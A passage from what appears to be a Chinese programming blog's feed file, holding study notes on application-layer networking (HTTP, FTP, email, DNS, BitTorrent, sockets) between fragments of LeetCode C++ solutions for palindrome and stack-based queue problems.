max) &#123;<br>                    max = r - l + <span class="hljs-number">1</span>;<br>                    ans = s.<span class="hljs-built_in">substr</span>(l, max);<br>                &#125;<br>                l--;<br>                r++;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>LeetCode</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>应用层</title>
    <link href="/2024/04/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A0%B8%E5%BF%83%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E2%80%94%E2%80%94%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95/%E5%BA%94%E7%94%A8%E5%B1%82/"/>
    <url>/2024/04/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A0%B8%E5%BF%83%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E2%80%94%E2%80%94%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95/%E5%BA%94%E7%94%A8%E5%B1%82/</url>
    
    <content type="html"><![CDATA[<h1 id="网络应用原理">1. 网络应用原理</h1><h2 id="创建网络应用">1.1 创建网络应用</h2><ul><li>在不同终端系统上运行，通过网络通信；</li><li>无需为网络核心设备编写软件。</li></ul><h2 id="应用架构">1.2 应用架构</h2><ul><li>client-server（CS）：客户机-服务器架构<ul><li>传统应用，如E-mail、FTP、WWW</li></ul></li><li>peer-to-peer (P2P) ：对等网络架构<ul><li>新型流量密集型应用，如IM(Instant Message),IPTV, Internet Phone, LiveStreaming</li></ul></li><li>hybrid of client-server and P2P：混合C/S和P2P架构</li></ul><h3 id="cs">1.2.1 CS</h3><ul><li>服务器：<ul><li>永远在线的主机</li><li>永久 IP 地址(固定 IP)</li><li>Web、FTP、Telnet、电子邮件</li><li>用于扩展的数据中心</li></ul></li><li>客户端：<ul><li>与服务器通信</li><li>可能是间断地连接</li><li>可能有动态 IP 地址</li><li><strong>不直接</strong>相互通信</li></ul></li></ul><h3 id="p2p">1.2.2 P2P</h3><ul><li><strong>没有</strong>永远在线的服务器</li><li>任意终端系统<strong>直接</strong>通信</li><li>对等体向其他对等体请求服务，向其他对等体提供服务作为回报<ul><li><strong>self-scalability（可收缩性）</strong>：新的对等体带来新的服务能力，以及新的服务需求</li></ul></li><li>对等体间断地连接，可能改变 IP 地址<ul><li>复杂的管理<br /></li><li>BitTorrent、eMule、Skpye、PPTV、Thunder</li></ul></li><li>成本低：通常不需要大量的服务器基础设施和服务器带宽</li></ul><h3 id="混合型">1.2.3 混合型</h3><ul><li>集中式服务：客户端存在检测/定位<ul><li>用户上线时向中央服务器注册其 IP 地址</li><li>用户联系中央服务器以查找好友的 IP 地址</li></ul></li><li>两个用户之间的聊天是 P2P 式的</li><li>例子：Skype</li></ul><h2 id="进程通信">1.3 进程通信</h2><p><strong>进程(process)</strong>：在主机内运行的程序。</p><ul><li>在同一主机内，两个进程使用<strong>进程间通信 (IPC)</strong>进行通信（由操作系统定义</li><li>在不同主机内，进程通过<strong>交换信息</strong>进行通信<ul><li>发起进程：创建并向网络发送信息</li><li>接收进程：接收信息并进行响应</li><li>定义：<strong>发起通信</strong>的进程被称为<strong>客户端</strong>，<strong>等待联系</strong>以开始会话的进程被称为<strong>服务器</strong></li><li>在网络应用程序中，客户端浏览器进程与网络服务器进程交换信息</li><li>采用 P2P架构的应用程序同时有客户端进程和服务器进程。在下面这个特定的通信会话中，A请求 B 发送文件，A 是客户端，B 是服务器。</li></ul></li></ul><h2 id="套接字">1.4 套接字</h2><ul><li>进程通过一个称为<strong>套接字（socket）</strong>的软件接口向网络发送信息，并从网络接收信息。</li><li>进程类似于房子，套接字类似于门<ul><li>发起进程将信息推出门外</li><li>发起进程依靠门另一侧的传输基础设施将信息传送到接收进程的套接字</li><li>应用层方面的控制，但对套接字传输层方面的控制却很少</li></ul></li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404031526976.png"alt="image-20240402132659911" /><figcaption aria-hidden="true">image-20240402132659911</figcaption></figure><h2 id="寻址过程">1.5 寻址过程</h2><ul><li>要接收信息，进程必须有<strong>标识符</strong></li><li><strong>IP</strong>地址区分不同<strong>主机</strong>，<strong>端口</strong>号区分相同主机不同<strong>进程</strong></li><li>标识符包括与主机上进程相关的 IP 地址和端口号</li><li>端口号示例：<ul><li>HTTP 服务器：80</li><li>邮件服务器（SMTP）： 25</li></ul></li><li>向 gaia.cs.umass.edu 网络服务器发送 HTTP 信息：<ul><li>P 地址：128.119.245.12</li><li>端口号： 80</li></ul></li></ul><h2 id="应用层协议">1.6 应用层协议</h2><ul><li>定义了运行在不同端系统上的应用程序进程如何相互传递报文<ul><li>报文类型</li><li>语法</li><li>语义</li><li>规则</li></ul></li><li>协议类型<ul><li>open protocols (公开协议)：如HTTP, SMTP</li><li>proprietary protocols (私有协议)：如Skype, QQ, Thunder</li></ul></li></ul><h2 id="应用程序需要的传输服务">1.7 应用程序需要的传输服务</h2><ul><li><strong>data integrity(数据完整性)</strong><ul><li>某些应用程序（如文件传输、网络交易）需要 100% 可靠的数据传输</li><li>其他应用程序（如音频、视频）可以容忍一定程度的数据丢失</li></ul></li><li><strong>Timing(及时性)</strong><ul><li>有些应用程序（如网络电话、互动游戏）需要低延迟才能有效运行</li></ul></li><li><strong>Throughput(吞吐量)</strong><ul><li>带宽敏感应用：有些应用程序（如多媒体）需要最低限度的吞吐量才能有效</li><li>弹性应用：可以利用它们获得的任何吞吐量（如电子邮件、文件传输、网络）</li></ul></li><li><strong>Security(安全性)</strong><ul><li>加密、数据完整性</li></ul></li></ul><h2 id="因特网传输协议服务">1.8 因特网传输协议服务</h2><ul><li><strong>TCP 服务</strong><ul><li>发送和接收方之间的<strong>可靠</strong>传输</li><li><strong>流量控制</strong>：发送方不会淹没接收方（避免接收方处理不过来）</li><li><strong>拥塞控制</strong>：当网络过载时对发送方进行节流（避免网络处理不过来）</li><li><strong>不提供：</strong>定时、最小吞吐量保证、安全</li><li><strong>面向连接</strong>：客户端和服务器进程之间需要进行连接设置</li></ul></li><li><strong>UDP 服务</strong><ul><li>发送和接收方之间<strong>不可靠</strong>传输</li><li><strong>不提供：</strong>可靠性、流量控制、拥塞控制、定时、吞吐量保证、安全性或连接设置</li></ul></li><li>TCP 和 UDP<ul><li>无加密 ；发送到套接字的信息以明文形式穿越因特网</li><li><strong>SSL (Secure Sockets Layer, 安全套接层)</strong><ul><li>提供加密连接、数据完整性、端点验证，以增强 TCP</li><li>不是第三种互联网传输协议，在<strong>应用层</strong>实施</li></ul></li><li>今天的因特网传输协议不提供吞吐量或及时性服务，但通常可以为时间敏感的应用提供令人满意的服务（不保证，但能基本满足）</li></ul></li></ul><h1 id="web和http">2. Web和HTTP</h1><h2 id="web概览">2.1 Web概览</h2><ul><li>网页(web) 由基本 HTML 文件和多个引用对象组成</li><li>对象可以是 HTML 文件、JPEG 图像、Java applet、音频文件</li><li>每个对象都可以通过 URL 进行寻址</li></ul><h2 id="http概览">2.2 HTTP概览</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404031526977.png"alt="image-20240402141407736" /><figcaption aria-hidden="true">image-20240402141407736</figcaption></figure><ul><li>HTTP: hypertext transfer protocol(超文本传输协议)</li><li>网络的应用层协议</li><li>客户端/服务器模式<ul><li>客户端：请求、接收（使用 HTTP 协议）和 "显示 "网络对象的浏览器</li><li>服务器：网络服务器（使用 HTTP 协议）根据请求发送对象</li></ul></li><li>使用 TCP（底层传输协议）：<ul><li>客户端启动与服务器的 TCP 连接（创建套接字），端口为 80</li><li>服务器接受来自客户端的 TCP 连接</li><li>浏览器（HTTP 客户端）和 Web 服务器（HTTP 服务器）之间交换 HTTP消息（应用层协议消息）</li><li>关闭 TCP 连接</li></ul></li><li>HTTP 是 <strong>"无状态 "协议（statelessprotocol）</strong>：服务器不保留任何有关过去客户端请求的信息</li></ul><h2 id="http连接">2.3 HTTP连接</h2><ul><li><p><strong>non-persistent connections(非持久连接)</strong>：每个请求/响应对通过单独的 TCP 连接发送</p></li><li><p><strong>persistent connections(持久连接)</strong>：所有请求及其相应的响应都通过同一个 TCP连接发送</p></li><li><p>HTTP 可以使用非持久连接和持久连接</p><ul><li><p>非持久 HTTP：</p><ul><li><p>通过一个 TCP连接最多发送一个对象，随后连接关闭；下载多个对象需要多个连接</p></li><li><p>用户可以通过配置浏览器来控制并行程度，使用并行连接可缩短响应时间</p></li><li><p><strong>Round-trip Time (RTT,往返时间)</strong>：一个<strong>小</strong>数据包（无传输延迟）从客户端到服务器再返回的时间，包括处理延迟、排队延迟和传播延迟</p></li><li><p>HTTP 响应时间 =2RTT+ 文件传输时间</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404031526978.png"alt="image-20240402141830612" /><figcaption aria-hidden="true">image-20240402141830612</figcaption></figure><ul><li>缺点：必须为每个请求对象建立和维护全新连接，增加操作系统开销 ；每个对象的交付延迟超过两个 RTTs</li></ul></li></ul></li><li><p>持久 HTTP：</p><ul><li>服务器在发送响应后保持连接打开</li><li>同一客户端/服务器之间的后续 HTTP 消息通过同一连接发送 客户端在遇到引用对象时立即发送请求</li><li>所有引用对象的 RTT 均为1</li></ul></li></ul></li><li><p>HTTP 的默认模式使用带有<strong>pipelinling（流水线）</strong>的<strong>持久连接</strong></p><ul><li>Pipelinling：不等待已发送消息的应答，连续发送后面的消息。</li></ul></li></ul><h2 id="http消息">2.4 HTTP消息</h2><p>HTTP 消息由采用 <strong>ASCII编码</strong>的多行文本构成，是服务器和客户端之间交换数据的方式。有两种类型的消息：<em>请求</em>（request）——由客户端发送用来触发一个服务器上的动作；<em>响应</em>（response）——来自服务器的应答。HTTP请求和响应具有相似的结构，由以下部分组成：</p><ol type="1"><li>一行起始行用于描述要执行的请求，或者是对应的状态，成功或失败。这个起始行总是单行的。</li><li>一个可选的 HTTP 标头集合指明请求或描述消息主体（body）。</li><li>一个空行指示所有关于请求的元数据已经发送完毕。</li><li>一个可选的包含请求相关数据的<em>主体</em>（比如 HTML表单内容），或者响应相关的文档。</li></ol><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404031526979.png"alt="image-20240402143958252" /><figcaption aria-hidden="true">image-20240402143958252</figcaption></figure><h3 id="请求报文">2.4.1 请求报文</h3><p>一般格式：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404031526980.png"alt="image-20240402142610659" /><figcaption aria-hidden="true">image-20240402142610659</figcaption></figure><p>实例：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404031526981.png"alt="image-20240402143212724" /><figcaption aria-hidden="true">image-20240402143212724</figcaption></figure><h3 id="响应报文">2.4.2 响应报文</h3><p>一般格式：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404031526982.png"alt="image-20240402142843784" /><figcaption aria-hidden="true">image-20240402142843784</figcaption></figure><p>实例：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404031526983.png"alt="image-20240402143005850" /><figcaption aria-hidden="true">image-20240402143005850</figcaption></figure><h3 id="响应状态码">2.4.3 响应状态码</h3><ul><li>200 OK：请求成功</li><li>301 Moved Permanently(永久)：请求对象已移动位置，新位置稍后在本信息中指定（Location：）</li><li>400 Bad Request：服务器无法理解请求信息</li><li>404 Not Found：在此服务器上未找到所请求的文件</li><li>505 HTTP Version Not Supported</li></ul><h3 id="上传表单输入">2.4.4 上传表单输入</h3><ul><li>POST method：表单输入信息在body字段</li><li>URL method：输入信息在URL中</li></ul><h3 id="方法类型">2.4.5 方法类型</h3><ul><li>HTTP/1.0：GET、POST、HEAD（要求服务器在响应中不包含请求对象）</li><li>HTTP/1.1：GET、POST、HEAD、PUT（将实体正文中的文件上传到 URL字段中指定的路径）、DELETE（删除 URL 字段中指定的文件）</li></ul><h2 id="cookie">2.6 Cookie</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404031526984.png"alt="image-20240402145421890" /><figcaption aria-hidden="true">image-20240402145421890</figcaption></figure><ul><li>为识别用户，许多网站使用 cookie</li><li>组成部分：<ul><li>HTTP 响应信息中的 cookie 标头行</li><li>下一个 HTTP 请求信息中的 cookie 标头行</li><li>保存在用户主机上的 cookie 文件，由用户的浏览器管理</li><li>网站的后端数据库</li></ul></li><li>用途：授权、购物车、推荐</li><li>保存状态<ul><li>协议端点：在多个事务中保持发送方/接收方的状态</li><li>cookie：使 http 消息携带状态，在无状态 http 上创建用户会话层</li></ul></li></ul><h2 id="web-caches">2.7 Web caches</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404031526985.png"alt="image-20240402145736599" /><figcaption aria-hidden="true">image-20240402145736599</figcaption></figure><ul><li>目标：满足客户端请求，而不涉及源服务器</li><li>用户设置浏览器：通过代理服务器访问 Web</li><li>浏览器向代理服务器发送所有 HTTP 请求<ul><li>缓存中已有对象：缓存返回对象</li><li>否则缓存向源服务器请求对象，然后将对象返回给客户端</li></ul></li><li>代理服务器同时充当客户端和服务器</li><li>使用原因：<ul><li>减少客户端请求的响应时间（如在线游戏）</li><li>减少机构接入链路到因特网的流量（如 html 文件缓存）</li></ul></li></ul><h2 id="内容分发网络">2.8 内容分发网络</h2><ul><li><p>Content Distribution Networks (CDNs)</p></li><li><p>网络缓存在互联网上发挥着越来越重要的作用</p></li><li><p>在整个互联网上安装了许多地理位置分散的缓存，从而将大部分流量本地化。</p></li></ul><h2 id="条件get">2.9 条件GET</h2><p>在网络缓存中的对象副本可能是陈旧的，条件获取（ConditionalGET）允许网络缓存检查对象是否是最新的。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404031526987.png"alt="image-20240402150824408" /><figcaption aria-hidden="true">image-20240402150824408</figcaption></figure><h1 id="文件传输协议">3. 文件传输协议</h1><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404031526988.png"alt="image-20240402151557780" /><figcaption aria-hidden="true">image-20240402151557780</figcaption></figure><ul><li><p><strong>FTP</strong>: File Transfer Protocol（文件传输协议）</p></li><li><p>客户机/服务器模式</p><ul><li>客户机：发起传输的一方</li><li>服务器：远程主机</li></ul></li><li><p>使用 <strong>TCP</strong>协议作为底层传输协议</p></li><li><p>客户端通过<strong>控制连接</strong>进行授权，发送命令</p></li><li><p>服务器收到文件传输命令后，向客户端打开第二个 TCP<strong>数据连接</strong></p></li><li><p><strong>控制连接</strong>在用户会话期间<strong>保持打开</strong>，传输一个文件后，服务器关闭数据连接，打开另一个TCP 数据连接以传输另一个文件</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404031526989.png"alt="image-20240402152146470" /><figcaption aria-hidden="true">image-20240402152146470</figcaption></figure></li><li><p>“out of band”带外：有两个通道同时进行交互（http,smtp:”in-band”）</p></li><li><p><strong>有状态协议：</strong>如当前目录，更早的验证</p></li></ul><h1 id="电子邮件">4. 电子邮件</h1><h2 id="组成部分">4.1 组成部分</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404031526990.png"alt="image-20240402153021617" /><figcaption aria-hidden="true">image-20240402153021617</figcaption></figure><ul><li><p><strong>用户代理</strong></p><ul><li>又称 "邮件阅读器"</li><li>撰写、编辑、阅读、回复、转发、保存邮件</li><li>如 Outlook、Thunderbird、iPhone 邮件客户端</li><li>发送、接收的邮件存储在服务器上</li></ul></li><li><p><strong>邮件服务器</strong></p><ul><li>邮箱包含用户接收的邮件</li><li>发送（待发）邮件信息的信息队列</li><li>邮件服务器之间发送邮件信息的 SMTP 协议<ul><li>客户端：发送邮件的服务器</li><li>服务器：接收邮件的服务器</li></ul></li></ul></li><li><p><strong>简单邮件传输协议（SMTP）</strong></p><ul><li>使用 <strong>TCP</strong> 协议，<strong>25</strong>号端口（服务器），<strong>持久连接</strong>，<strong>有状态协议</strong></li><li>直接传输：发送服务器（SMTP 客户端）到接收服务器（SMTP 服务器）</li><li>命令/响应交互（如 HTTP、FTP）<ul><li>命令：ASCII 文本</li><li>响应：状态代码和短语</li></ul></li><li>SMTP 服务器使用 <code>CRLF.CRLF</code> 确定信息结束</li></ul><table><thead><tr class="header"><th>SMTP</th><th>HTTP</th></tr></thead><tbody><tr class="odd"><td>推的协议（发送信息）</td><td>拉的协议（获取信息）</td></tr><tr class="even"><td>报文必须是 7 位 ASCII 码</td><td>无限制</td></tr><tr class="odd"><td>所有对象放在一个消息中</td><td>每个对象对应一个响应消息</td></tr></tbody></table></li></ul><h2 id="邮件报文格式">4.2 邮件报文格式</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404031526991.png"alt="image-20240402154718947" /><figcaption aria-hidden="true">image-20240402154718947</figcaption></figure><h2 id="邮件访问协议">4.3 邮件访问协议</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404031526992.png"alt="image-20240402154838522" /><figcaption aria-hidden="true">image-20240402154838522</figcaption></figure><ul><li>SMTP：向接收方服务器发送/存储（推送）</li><li>邮件访问协议：从服务器检索（拉取）<ul><li>POP3</li><li>IMAP</li><li>HTTP</li></ul></li></ul><h3 id="pop3">4.3.1 POP3</h3><ul><li>POP3: Post Office Protocol –version3(邮局协议版本3)</li><li>工作流程：认证；事务处理；更新</li><li>模式：<ul><li>下载并删除：如果更换客户端，则无法重新阅读电子邮件</li><li>下载并保留：不同客户端的信息副本</li></ul></li><li>端口：110</li><li><strong>无状态协议</strong></li></ul><h3 id="imap">4.3.2 IMAP</h3><ul><li>IMAP: Internet Mail Access Protocol (Internet邮件访问协议)</li><li>管理服务器中的文件</li><li>可将所有邮件集中在一个地方：在服务器上</li><li>用户可将邮件整理到文件夹中</li><li><strong>有状态协议</strong></li></ul><h1 id="dns">5. DNS</h1><ul><li>Domain Name System：域名系统</li><li>一个由分层的DNS服务器实现的<strong>分布式数据库</strong></li><li>一个使主机能查询分布式数据库的<strong>应用层协议</strong></li><li>下层协议：<strong>UDP</strong></li><li>端口：<strong>53</strong></li></ul><h2 id="dns服务">5.1 DNS服务</h2><p>通常由其他应用层协议（包括 HTTP、SMTP 和 FTP）使用</p><ul><li><strong>域名到IP地址转换</strong></li><li><strong>主机别名</strong>：获取主机别名对应的规范主机名及主机IP地址</li><li><strong>邮件服务器别名</strong>：获取邮件服务器别名对应的规范主机名及主机IP地址</li><li><strong>负载分配</strong></li></ul><h2 id="分布式层次数据库">5.2 分布式层次数据库</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404031526993.png"alt="image-20240402161242414" /><figcaption aria-hidden="true">image-20240402161242414</figcaption></figure><h2 id="本地dns服务器">5.3 本地DNS服务器</h2><ul><li>不属于（以上）层次结构</li><li>每个 ISP都有一个，也称为 "默认名称服务器"</li><li>当主机连接到 ISP 时提供一个或多个本地 DNS 服务器的 IP 地址</li><li>当主机进行 DNS 查询时，查询会被发送到其本地 DNS 服务器：<ul><li>本地缓存有最近的名称到地址转换对（但可能已经过期！）</li><li>充当代理，将查询转发到层次结构中</li></ul></li><li>一旦DNS服务器获得映射，它就会缓存映射；缓存可能过时</li><li>TLD 服务器通常缓存在本地DNS服务器中</li></ul><h2 id="dns查询">5.4 DNS查询</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404031526994.png"alt="image-20240402161953265" /><figcaption aria-hidden="true">image-20240402161953265</figcaption></figure><p><strong>迭代查询：</strong>被联系的服务器回复要联系的服务器名称（常用的模式）</p><p><strong>递归查询：</strong>将名称解析的重任交给联系的名称服务器；层次结构中上层负担重</p><h2 id="dns记录">5.5 DNS记录</h2><p>DNS：存储<strong>资源记录 (RR)</strong> 的分布式数据库</p><ul><li>Type=A ：标准的主机名到IP映射（www.bar.foo.com, 145.37.93.126,A）</li><li>Type=NS：域的权威DNS服务器（foo.com, dns.foo.com, NS）</li><li>Type=CNAME：别名对应的规范主机名（foo.com, relay1.bar.foo.com,CNAME）</li><li>Type=MX：别名对应的邮件服务器的规范主机名（foo.com,mail.bar.foo.com, MX）</li></ul><h2 id="dns报文">5.6 DNS报文</h2><p>DNS 报文分为 <strong>请求</strong> 和 <strong>应答</strong>两种，结构是类似的，大致分为五部分：</p><ul><li>头部（ <em>header</em> ），描述报文类型，以及其下 4个小节的情况；</li><li>问题节（ <em>question</em> ），保存查询问题；</li><li>答案节（ <em>answer</em> ），保存问题答案，也就是查询结果；</li><li>授权信息节（ <em>authority</em> ），保存授权信息；</li><li>附加信息节（ <em>additional</em> ），保存附加信息；</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404031526995.png"alt="image-20240403143024635" /><figcaption aria-hidden="true">image-20240403143024635</figcaption></figure><p>头部分为 6 个字段：</p><ul><li><strong>标识</strong>（ <em>identifier</em> ），一个 16 位的 ID，在应答中原样返回，以此匹配请求和应答；</li><li><strong>标志</strong>（ <em>flags</em> ），一些标志位，共 16位；</li><li><strong>问题记录数</strong>（ <em>question count</em> ），一个 16位整数，表示问题节中的记录个数；</li><li><strong>答案记录数</strong>（ <em>answer count</em> ），一个 16位整数，表示答案节中的记录个数；</li><li><strong>授权信息记录数</strong>（ <em>authority record count</em>），一个 16 位整数，表示授权信息节中的记录个数；</li><li><strong>附加信息记录数</strong>（ <em>additional record count</em>），一个 16 位整数，表示附加信息节中的记录个数；</li></ul><p>标志字段中的各个标志位：</p><ul><li>QR 位标记报文是一个查询请求，还是查询应答；<ul><li>0 表示查询<strong>请求</strong>；</li><li>1 表示查询<strong>应答</strong>；</li></ul></li><li>操作码（opcode）占 4 位，表示操作类型：<ul><li>0 代表标准查询；</li><li>1 代表反向查询；</li><li>2 代表服务器状态请求；</li></ul></li><li>AA 位表示 <strong>权威回答</strong>（ <em>authoritative answer</em>），意味着当前查询结果是由域名的权威服务器给出的；</li><li>TC 位表示 <strong>截短</strong>（ <em>truncated</em> ），使用 UDP时，如果应答超过 512 字节，只返回前 512 个字节；</li><li>RD 位表示<strong>期望递归</strong>（recursiondesired），在请求中设置，并在应答中返回；<ul><li>该位为 1时，服务器必须处理这个请求：如果服务器没有授权回答，它必须替客户端请求其他DNS 服务器，这也是所谓的 <strong>递归查询</strong> ；</li><li>该位为 0时，如果服务器没有授权回答，它就返回一个能够处理该查询的服务器列表给客户端，由客户端自己进行<strong>迭代查询</strong> ；</li></ul></li><li>RA 位表示<strong>可递归</strong>（ <em>recursion available</em>），如果服务器支持递归查询，就会在应答中设置该位，以告知客户端；</li><li>保留位，这 3 位目前未用，留作未来扩展；</li><li>响应码（response code）占 4 位，表示请求结果，常见的值包括：<ul><li>0 表示没有差错；</li><li>3表示名字差错，该差错由权威服务器返回，表示待查询的域名不存在；</li></ul></li></ul><h2 id="dns攻击">5.7 DNS攻击</h2><ul><li>DDoS攻击</li><li>重定向攻击：中间人、DNS投毒</li><li>利用DNS进行DDoS</li></ul><h1 id="p2p应用">6. P2P应用</h1><h2 id="文件分发">6.1 文件分发</h2><ul><li><p>客户机-服务器架构：服务器必须按顺序上传<strong>N份</strong>文件副本，每个客户端必须下载文件副本。 <spanclass="math display">\[D_{c-s} \geq max\{\frac{NF}{u_s},\frac{F}{d_{min}}\}\]</span></p></li><li><p>对等网络架构：服务器必须上传<strong>至少一份</strong>副本，每个客户端必须下载文件副本，总计必须上传<strong>N份</strong>文件副本。 <span class="math display">\[D_{p2p} \geqmax\{\frac{F}{u_s},\frac{F}{d_{min}},\frac{NF}{u_s+\sum_{i=1}^N u_i}\}\]</span></p></li></ul><h2 id="bittorrent">6.2 BitTorrent</h2><p>BitTorrent 协议是架构于 TCP/IP 协议之上的一个 <strong>P2P文件传输协议</strong>，处于 TCP/IP结构的<strong>应用层</strong>。如果有多个下载者并发的下载同一个文件，则每个下载者也同时为其它下载者上传文件，这样，文件源可以支持大量的用户进行下载，而只带来适当的负载的增长。BitTorrent协议把提供下载的文件虚拟分成大小相等的块，块大小必须为 2k的整数次方（由于是虚拟分块，硬盘上并不产生各个块文件），并把每个块的索引信息和Hash 验证码写入 .torrent文件（即种子文件，也简称为“种子”）中，作为被下载文件的“索引”。下载者要下载文件内容，需要先得到相应的 .torrent 文件，然后使用 BT客户端软件进行下载。</p><ul><li>请求块：稀少资源优先</li><li>发送块： tit-for-tat（以牙还牙）<ul><li>向当前向其发送信息块速率最高的 4 个对等节点发送信息块，其他对等节点被阻塞，每 10 秒重新评估前 4 个对等节点</li><li>每过 30 秒，随机选择另一个对等点，开始发送数据块</li></ul></li></ul><h1 id="套接字编程">7. 套接字编程</h1><ul><li>套接字：应用过程（房屋）和终端传输协议之间的门</li><li>针对两种传输服务的两种套接字类型：<ul><li>UDP：无连接、不可靠数据报、不保证交付</li><li>TCP：面向连接、可靠、面向字节流</li></ul></li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404031526996.png"alt="image-20240403151756256" /><figcaption aria-hidden="true">image-20240403151756256</figcaption></figure><h2 id="udp">7.1 UDP</h2><ul><li>发送数据前不握手</li><li>发送方明确地为每个数据包附加 IP 目标地址和端口</li><li>接收方从收到的数据包中提取发送方 IP 地址和端口</li></ul><h2 id="tcp">7.2 TCP</h2><ul><li><p>服务器必须准备就绪</p><ul><li>服务器进程必须首先运行</li><li>服务器必须创建了欢迎客户联系的套接字（门）</li></ul></li><li><p>客户端通过以下方式联系服务器</p><ul><li><p>创建 TCP 套接字，指定服务器进程的 IP 地址和端口号</p></li><li><p>当客户端创建套接字时，客户端 TCP 与服务器 TCP 建立连接</p></li><li><p>当客户端联系服务器时，服务器 TCP为服务器进程创建新的套接字，以便与特定客户端通信</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404031526997.png"alt="image-20240403152445097" /><figcaption aria-hidden="true">image-20240403152445097</figcaption></figure></li></ul></li></ul><p><strong>参考资料：</strong></p><ol type="1"><li>计算机网络——自顶向下方法（第七版）</li><li>HTTP消息：https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Messages</li><li>DNS云学堂 |递归、迭代查询如何在具体场景下灵活使用？http://m.zdns.cn/news/199.html</li><li>DNS报文格式：https://fasionchan.com/network/dns/packet-format/</li><li>BitTorrent原理简介：https://jaminzhang.github.io/p2p/BitTorrent-Principle-Introduction/</li><li>BitTorrent 协议规范：https://medium.com/<span class="citation"data-cites="imfile.io/bittorrent">@imfile.io/bittorrent</span>-%E5%8D%8F%E8%AE%AE%E8%A7%84%E8%8C%83-771a80a3cab8</li></ol>]]></content>
    
    
    <categories>
      
      <category>计算机核心课程</category>
      
      <category>计算机网络</category>
      
      <category>计算机网络——自顶向下方法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>栈与队列篇</title>
    <link href="/2024/03/31/LeetCode/%E6%A0%88%E4%B8%8E%E9%98%9F%E5%88%97%E7%AF%87/"/>
    <url>/2024/03/31/LeetCode/%E6%A0%88%E4%B8%8E%E9%98%9F%E5%88%97%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="栈的实现">1. 栈的实现</h1><h2 id="用栈实现队列">用栈实现队列</h2><blockquote><p>将一个栈当作输入栈，用于压入 push传入的数据；另一个栈当作输出栈，用于 pop 和 peek操作。每次 pop 或 peek时，若输出栈为空则将输入栈的全部数据依次弹出并压入输出栈，这样输出栈从栈顶往栈底的顺序就是队列从队首往队尾的顺序。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyQueue</span> &#123;<br><span class="hljs-keyword">private</span>:<br>    stack&lt;<span class="hljs-type">int</span>&gt; inStack, outStack;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">in2out</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">while</span> (!inStack.<span class="hljs-built_in">empty</span>()) &#123;<br>            outStack.<span class="hljs-built_in">push</span>(inStack.<span class="hljs-built_in">top</span>());<br>            inStack.<span class="hljs-built_in">pop</span>();<br>        &#125;<br>    &#125;<br><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">MyQueue</span>() &#123;&#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> 